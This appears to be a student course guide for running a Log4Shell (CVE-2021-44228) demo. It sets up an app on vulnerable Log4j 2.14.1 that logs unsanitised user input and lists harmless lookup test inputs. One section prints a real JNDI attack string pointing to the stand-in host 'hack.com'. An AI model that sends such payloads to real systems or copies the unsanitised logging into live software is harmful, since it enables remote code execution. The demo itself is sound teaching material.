# Log4Shell Vulnerability Demo - Running Guide

## Overview

This demo application shows how the Log4Shell vulnerability (CVE-2021-44228) works by demonstrating how Apache Log4j automatically evaluates expressions in log messages.

## What This Demo Does

The vulnerable application accepts user input (a username) and logs it directly without sanitization:

```java
logger.info("Login attempt for user: " + username);
```

Log4j automatically interprets `${}` expressions in the logged message, demonstrating the vulnerability.

## Prerequisites

- Java 11 or higher
- Maven 3.6 or higher
- Terminal/Command Prompt

## Installation & Setup

### Step 1: Navigate to the Demo Directory

```bash
cd "c:\Programming\SC3010\Case Study 2\Demo"
```

### Step 2: Build the Project with Maven

```bash
mvn clean package
```

This will:
- Download Log4j 2.14.1 (the vulnerable version of Log4j)
- Compile the Java application
- Create an executable JAR file

**Output:** `target/log4shell-demo-1.0-SNAPSHOT-jar-with-dependencies.jar`

### Step 3: Run the Demo Application

```bash
java -jar target/log4shell-demo-1.0-SNAPSHOT-jar-with-dependencies.jar
```

If you prefer to run from compiled classes, you must include Log4j's dependency JARs on the classpath as well. The packaged JAR above is the simplest option.

## Test Payloads (Safe Expression Evaluation)

When the application prompts for a username, try these inputs to see Log4j evaluate expressions:

### Test 1: Java Version Lookup
```
${java:version}
```

**Expected Output:**
```
INFO - Login attempt for user: 17.0.1
```

Log4j evaluates `${java:version}` and returns the actual Java version instead of printing the literal string.

---

### Test 2: Java Runtime Name
```
${java:runtime}
```

**Expected Output:**
```
INFO - Login attempt for user: Java(TM) SE Runtime Environment ...
```

---

### Test 3: Operating System Information
```
${sys:os.name}
```

**Expected Output:**
```
INFO - Login attempt for user: Windows 11 (Or your OS name)
```



---

### Test 4: User Home Directory
```
${sys:user.home}
```

**Expected Output:**
```
INFO - Login attempt for user: C:\Users\YourUsername
```

---

### Test 5: Multiple Expressions
```
${java:version} - ${sys:os.name}
```

**Expected Output:**
```
INFO - Login attempt for user: 17.0.1 - Windows 11
```

---

## What Happens in a Real Attack?

In a real Log4Shell attack, instead of safe lookups like `${java:version}`, an attacker would use:

```
${jndi:ldap://hack.com:1389/Exploit}
```

This would:
1. Parse the JNDI lookup
2. Connect to `hack.com` 
3. Download a malicious Java serialized object
4. Execute arbitrary code with the application's permissions

## Logs Output

Two types of logs are created:
1. **Console:** Real-time output while running
2. **File:** Stored in `logs/VulnerableApp.log`

Check the file log to see all logged expressions that were evaluated.

## References

- [CVE-2021-44228 - Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Advisory](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Alert - Log4Shell](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [IBM - Log4Shell](https://www.ibm.com/think/topics/log4shell)

## Troubleshooting

### Maven Not Found
Install Maven from https://maven.apache.org/download.cgi and add to PATH

### Java Version Mismatch
```bash
javac -version
```
Should be Java 11 or higher. Update if needed.

### Class Not Found: VulnerableApp
Make sure you're in the correct directory and Maven built successfully:
```bash
mvn clean compile
```

### No Output After Input
Check that log4j2.xml is in the classpath. When using Maven:
```bash
mvn clean package
java -jar target/log4shell-demo-1.0-SNAPSHOT-jar-with-dependencies.jar
```

## Questions?

For more information on Log4Shell, see the main **Log4Shell Case Study.md** document.
